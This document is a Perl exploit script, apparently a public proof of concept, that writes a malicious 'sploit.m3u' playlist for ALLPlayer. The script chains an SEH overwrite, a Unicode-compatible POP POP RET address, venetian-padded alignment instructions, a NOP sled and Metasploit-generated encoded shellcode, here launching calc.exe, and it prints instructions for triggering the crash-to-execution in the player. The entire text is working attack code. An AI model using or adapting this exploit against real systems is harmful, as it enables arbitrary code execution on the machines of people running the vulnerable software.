use strict;
use warnings;
 
my $filename = "sploit.m3u";
 
my $junk1 = "\x41" x 301;   # Offset to SEH
my $nSEH  = "\x61\x50";     # POPAD # Venetian padding
my $SEH   = "\x50\x45";     # POP POP RET from ALLPlayer.exe
my $junk2 = "\x42" x 700;
  
my $align = "\x53".         # PUSH EBX
            "\x6e".         # Venetian padding
            "\x58".         # POP EAX
            "\x6e".         # Venetian padding
            "\x05\x14\x11". # ADD EAX,0x11001400
            "\x6e".         # Venetian padding
            "\x2d\x13\x11". # SUB EAX,0x11001300
            "\x6e".         # Venetian padding
            "\x50".         # PUSH EAX
            "\x6e".         # Venetian padding
            "\xc3";         # RET
 
my $nops = "\x71" x 109;
 
# msfpayload windows/exec cmd=calc.exe R
# msfencode -e x86/unicode_mixed BufferRegister=EAX
my $shellcode = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAh".
"AAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBkLyXTI9pKPip".
"S02iwuP1z2RDRkb2nP2kNrjlDKnrN4BkD2NHJofWPJLfNQyonQGPDlmloqSLyrNLmPy16ozmYqY7".
"JBzPB2R72kqBLPrkMrmlZaj0Bka0d83UGP1dOZYqvpb04Ka8mH4KR8kpYqyCHcMlQ9DKmdDKM18V".
"nQyolqEpdl91FojmzahGNXk01eYd9s3M8xMk1mmTbUYRr8dKNxldKQWcRFRklLpKBkaHKl9qwc2k".
"itRk9qFp3Yq4O4mT1K1Ks1aI0Zb1KOGpR8QOPZrkMBJKTFqMRJkQBm3UgIipYpypNp38matKpoe7".
"ioyE7KJP85vBQF0heVCeEm3mio7eMlYvsLiz3PikiP45ze7KPGJs1bpoBJKP0SkOiEqSaQBL33ln".
"s5sH2E9pAA";
  
my $sploit = $junk1.$nSEH.$SEH.$align.$nops.$shellcode.$junk2;
 
open(FILE, ">$filename") || die "[-]Error:\n$!\n";
print FILE "http://$sploit";
close(FILE);
 
print "\nExploit file created successfully [$filename]!\n\n";
print "You can either:\n";
print "\t1. Open the created $filename file directly with ALLPlayer\n";
print "\t2. Open the crafted URL via menu by Open movie/sound -> Open URL\n\n";
print "http://$sploit\n";